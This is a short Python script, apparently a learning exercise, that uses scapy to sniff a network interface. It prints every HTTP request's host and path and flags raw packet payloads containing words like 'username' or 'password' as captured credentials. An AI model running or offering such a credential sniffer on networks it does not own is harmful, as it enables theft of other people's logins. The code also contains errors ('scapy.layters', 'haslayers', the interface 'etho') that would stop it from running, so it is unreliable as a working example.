#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Created on Thu Aug 13 17:29:41 2020

@author: djmaan
"""

import scapy.all as scapy
from scapy.layters import http

def sniff(interface):
    scapy.sniff(iface=interface, store = False, prn = process_sniffed_packet,)
    
def get_url(packet):
    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path

def get_login_info(packet):
    if packet.haslayers(scapy.Raw):
            #print(packet[scapy.Raw].load)
            load = str(packet[scapy.Raw].load)
            keywords = ["username", "user", "login", "password", "pass"]
            for keyword in keywords:
                if keyword in load:
                    return load
                   
           # if "username" in load:
            #    print(load)
    
def process_sniffed_packet(packet):
    if packet.haslayers(http.HTTPRequest):
        #print(packet.show())
        url = get_url(packet)
        print("[+] HTTP Request >>" +str(url)) # or url.decode()
        
        login_info = get_login_info(packet)
        if login_info:
             print("[+] Possible username/password >>" + login_info+ "\n\n")
                    
    
sniff("etho")